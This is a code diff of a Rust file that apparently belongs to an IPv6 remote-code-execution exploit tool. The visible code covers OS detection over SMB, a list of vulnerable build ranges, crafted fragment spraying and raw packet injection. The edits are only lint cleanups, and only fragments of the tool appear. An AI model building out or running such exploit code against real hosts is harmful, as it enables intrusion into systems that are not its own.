@@ -25,8 +25,10 @@ use std::time::Duration;
 use tracing::info;
 
 const FRAGMENT_HEADER: u8 = 44;
+#[allow(dead_code)]
 const HOP_BY_HOP: u8 = 0;
 const DEST_OPTIONS: u8 = 60;
+#[allow(dead_code)]
 const ICMPV6_ECHO: u8 = 128;
 
 /// Known vulnerable build ranges (major.minor.build).
@@ -210,10 +212,10 @@ fn detect_os_via_smb(ip: &Ipv6Addr) -> Option<String> {
         let smb_neg = build_smb_negotiate();
         if stream.write_all(&smb_neg).is_ok() {
             let mut buf = [0u8; 1024];
-            if stream.read(&mut buf).is_ok() {
-                if let Some(os) = extract_os_from_smb(&buf) {
-                    return Some(os);
-                }
+            if stream.read(&mut buf).is_ok()
+                && let Some(os) = extract_os_from_smb(&buf)
+            {
+                return Some(os);
             }
         }
     }
@@ -261,12 +263,7 @@ fn build_fragment_spray(config: &Ipv6RceConfig) -> Vec<Vec<u8>> {
 fn build_single_fragment(target: &Ipv6Addr, id: u16, payload: Ipv6Payload) -> Vec<u8> {
     // Build a crafted IPv6 fragment with extension headers
     // IPv6 header (40 bytes) + Fragment Header (8 bytes) + payload
-    let mut pkt = Vec::new();
-
-    // IPv6 fixed header (40 bytes)
-    // Version (4), Traffic Class (8), Flow Label (20)
-    pkt.push(0x60);
-    pkt.push(0x00);
+    let mut pkt = vec![0x60, 0x00, 0x00, 0x00];
     pkt.push(0x00);
     pkt.push(0x00);
     // Payload length (placeholder)
@@ -310,6 +307,7 @@ fn build_single_fragment(target: &Ipv6Addr, id: u16, payload: Ipv6Payload) -> Ve
     pkt
 }
 
+#[allow(dead_code)]
 async fn send_fragments_linux(target: &Ipv6Addr, _fragments: &[Vec<u8>], log: &mut Vec<String>) {
     // On Linux with CAP_NET_RAW, use pnet to inject raw IPv6 packets
     log.push(format!(
